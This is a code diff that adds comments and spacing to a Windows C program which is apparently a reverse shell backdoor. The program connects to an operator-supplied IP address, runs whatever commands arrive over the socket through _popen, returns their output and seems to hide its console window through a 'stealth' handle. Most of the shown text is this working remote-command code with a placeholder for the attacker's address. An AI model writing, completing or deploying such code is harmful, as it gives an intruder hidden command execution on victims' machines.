@@ -5,17 +5,20 @@
 #include <windows.h>
 #include <string.h>
 
+// Define bzero if it's not available on the system
 #define bzero(p, size) (void) memset((p), 0, (size))
 
 int sock;
 char ip[] = "your ip(example: 192.168.0.1)";
 
+// Function to handle the command shell execution
 void Shell() {
-    char buffer[1024];
-    char container[1024];
-    char total_response[18384];
+    char buffer[1024]; // Buffer to store received commands
+    char container[1024]; // Buffer to store command output temporarily
+    char total_response[18384]; // Buffer to store complete command output
 
     while (1) {
+        // Clear the buffers
         bzero(buffer, sizeof(buffer));
         bzero(container, sizeof(container));
         bzero(total_response, sizeof(total_response));
@@ -34,7 +37,7 @@ void Shell() {
             closesocket(sock);
             WSACleanup();
             exit(0);
-        }else {
+        } else {
             FILE *fp;
             // Execute the received command
             fp = _popen(buffer, "r");
@@ -42,6 +45,7 @@ void Shell() {
                 perror("popen failed");
                 continue;
             }
+            // Read the output of the command
             while (fgets(container, sizeof(container), fp) != NULL) {
                 strcat(total_response, container);
             }
@@ -54,15 +58,17 @@ void Shell() {
                 WSACleanup();
                 exit(1);
             }
+            // Close the command output file
             fclose(fp);
         }
     }
 }
 
+// Entry point of the program
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
     HWND stealth;
 
-    // Allocate console for the program
+    // Allocate console for the program (useful for debugging)
     AllocConsole();
     stealth = FindWindowA("ConsoleWindowClass", NULL);
 
@@ -91,8 +97,9 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
         WSACleanup();
         exit(1);
     }
-    memset(&ServAddr, 0, sizeof(ServAddr));
 
+    // Zero out the server address structure
+    memset(&ServAddr, 0, sizeof(ServAddr));
     ServAddr.sin_family = AF_INET;
     ServAddr.sin_addr.s_addr = inet_addr(ServIP);
     ServAddr.sin_port = htons(ServPort);
